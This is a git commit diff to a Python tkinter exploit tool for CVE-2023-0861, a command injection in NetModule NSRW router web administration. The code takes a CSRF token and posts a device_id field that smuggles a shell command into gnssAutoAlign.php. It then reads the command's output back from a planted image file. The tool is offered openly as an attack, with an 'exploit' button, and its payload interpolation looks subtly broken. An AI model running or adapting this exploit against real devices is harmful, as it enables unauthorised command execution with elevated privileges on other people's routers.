3a7fbdf845e04993b6e9abd51c72309958c4d19c
ibrahim ali <82097150+abrahim7112@users.noreply.github.com>
2023-08-30 10:27:33 -0400

    Update CVE_2023_0861.py
    Signed-off-by: ibrahim ali <82097150+abrahim7112@users.noreply.github.com>

--- CVE_2023_poc/CVE_2023_0861.py
+++ CVE_2023_poc/CVE_2023_0861.py
@@ -10,19 +10,14 @@ from time import strftime
 from tkinter import ttk
 import requests
 
-root = tkinter.Tk()
-root.title("CVE_2023_0861 exploits")
-root.geometry('600x400+0+0')
-def printInput():
-    inp = inputtxt.get(1.0, "end-1c")
-    lbl.config(text = "attack url : "+inp)
-    url = inp
-    scroll_y = Scrollbar(root, orient=VERTICAL)
-    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
-            "times new roman", 15, "bold"), fg="#3206b8")
-    scroll_y.pack(side=RIGHT, fill=Y)
-    scroll_y.config(command=txtarea.yview)
-    txtarea.pack(fill=BOTH, expand=1)
+def Apache():
+    root = tkinter.Tk()
+    root.title("CVE_2023_0861 exploits")
+    root.geometry('800x600+0+0')
+    def printInput():
+        inp = inputtxt.get(1.0, "end-1c")
+        lbl.config(text = "attack url : "+inp)
+        url = inp
 
 #parser = argparse.ArgumentParser(description='CVE-2023-0861 PoC')
 #parser.add_argument('--url', type=str, required=True, help='URL of the vulnerable router')
@@ -30,34 +25,50 @@ def printInput():
 #parser.add_argument('--payload', type=str, required=True, help='Command Injection Payload')
 #args = parser.parse_args()
 
-    url = f'{url}/admin/gnss.php'
-    c = {'PHPSESSID':''}
-    response = requests.get(url,cookies=c)
-    csrf_token = re.search(r'<input type="hidden" name="csrf-token" value="([^"]+)">', response.text)
+        url = f'{url}/admin/gnss.php'
+        c = {'PHPSESSID':''}
+        response = requests.get(url,cookies=c)
+        csrf_token = re.search(r'<input type="hidden" name="csrf-token" value="([^"]+)">', response.text)
 #print(csrf_token)
-    data = {
-       'toggleAlignment': 'test',
-        'device_id': f'1; {id} > /home/www-data/admin/img/nothing.png; 2',
-        'csrf-token': csrf_token,
-    }
+        data = {
+           'toggleAlignment': 'test',
+            'device_id': f'1; {id} > /home/www-data/admin/img/nothing.png; 2',
+            'csrf-token': csrf_token,
+        }
 #print(f'1; {urllib.parse.unquote(args.payload)} > /home/www-data/admin/img/nothing.png 2')
-    url = f'{url}/admin/gnssAutoAlign.php'
+        url = f'{url}/admin/gnssAutoAlign.php'
 
-    response = requests.post(url, data=data,cookies=c)
-
-    if response.status_code == 200:
-        results = requests.get(f'{url}/admin/img/nothing.png',cookies=c)
-        txtarea.insert(END, 'done!')
-        txtarea.insert(END, results.content.decode())
+        response = requests.post(url, data=data,cookies=c)
+        scroll_y = Scrollbar(root, orient=VERTICAL)
+        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
+        scroll_y.pack(side=RIGHT, fill=Y)
+        scroll_y.config(command=txtarea.yview)
+        txtarea.insert(END, "response:\n")
+        txtarea.insert(END, response)
+        txtarea.insert(END, "\n---------------------------------------------------------------------------------\n")
+        txtarea.insert(END, "\nresponse text:\n")
+        txtarea.insert(END, response.text)
+        txtarea.pack(fill=BOTH, expand=True)
+        txtarea.configure(state ='disabled')
+        if response.status_code == 200:
+            results = requests.get(f'{url}/admin/img/nothing.png',cookies=c)
+            scroll_y = Scrollbar(root, orient=VERTICAL)
+            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
+            scroll_y.pack(side=RIGHT, fill=Y)
+            scroll_y.config(command=txtarea.yview)
+            txtarea.insert(END, 'done!')
+            txtarea.insert(END, results.content.decode())
+            txtarea.pack(fill=BOTH, expand=True)
+            txtarea.configure(state ='disabled')
        # print('done!')
        # print(results.content.decode())
 
-Hacher = Label(root, text="NetModule NSRW web administration interface executes an OS command constructed with \nunsanitized user input. A successful exploit could allow an authenticated user to execute arbitrary \ncommands with elevated privileges. This issue affects NSRW: from 4.3.0.0 before 4.3.0.119, \nfrom 4.4.0.0 before 4.4.0.118, from 4.6.0.0 before 4.6.0.105, from 4.7.0.0 before 4.7.0.103").pack()  
-Hacher = Label(root, text="Enter url http://www.example.com/ : ").pack()
-inputtxt = tk.Text(root,height = 1,width = 80)
-inputtxt.pack()
-printButton = tk.Button(root,text = "exploit", command = printInput)
-printButton.pack()
-lbl = tk.Label(root, text = "")
-lbl.pack()
-root.mainloop()
+    Hacher = Label(root, text="NetModule NSRW web administration interface executes an OS command constructed with \nunsanitized user input. A successful exploit could allow an authenticated user to execute arbitrary \ncommands with elevated privileges. This issue affects NSRW: from 4.3.0.0 before 4.3.0.119, \nfrom 4.4.0.0 before 4.4.0.118, from 4.6.0.0 before 4.6.0.105, from 4.7.0.0 before 4.7.0.103").pack()  
+    Hacher = Label(root, text="Enter url http://www.example.com/ : ").pack()
+    inputtxt = tk.Text(root,height = 1,width = 80)
+    inputtxt.pack()
+    printButton = tk.Button(root,text = "exploit", command = printInput)
+    printButton.pack()
+    lbl = tk.Label(root, text = "")
+    lbl.pack()
+    root.mainloop()
